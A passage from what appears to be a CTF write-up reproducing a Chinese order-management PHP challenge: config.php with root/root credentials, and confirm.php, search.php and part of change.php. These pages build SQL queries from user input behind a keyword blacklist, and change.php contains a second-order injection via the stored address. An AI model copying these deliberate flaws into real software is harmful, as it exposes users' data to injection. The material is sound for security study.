<span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!--?<span class="title">file</span>=?--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$DATABASE</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dbname&quot;</span> =&gt;<span class="string">&quot;ctfusers&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DATABASE</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$DATABASE</span>[<span class="string">&#x27;dbname&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="confirm-php"><a href="#confirm-php" class="headerlink" title="confirm.php"></a>confirm.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$user_name</span>.<span class="string">&quot;已提交订单&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$user_name</span>, <span class="variable">$address</span>, <span class="variable">$phone</span>);</span><br><span class="line">        <span class="variable">$re</span> = <span class="variable">$re</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$re</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单提交成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;确认订单&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">img</span> <span class="title">class</span>=&quot;<span class="title">logo</span>&quot; <span class="title">src</span>=&quot;./<span class="title">assets</span>/<span class="title">img</span>/<span class="title">logo</span>-<span class="title">zh</span>.<span class="title">png</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><h3 id="search-php"><a href="#search-php" class="headerlink" title="search.php"></a>search.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;搜索&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;订单查询&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;查询订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;返回&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt; </span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;    </span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="change-php"><a href="#change-php" class="headerlink" title="change.php"></a>change.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span 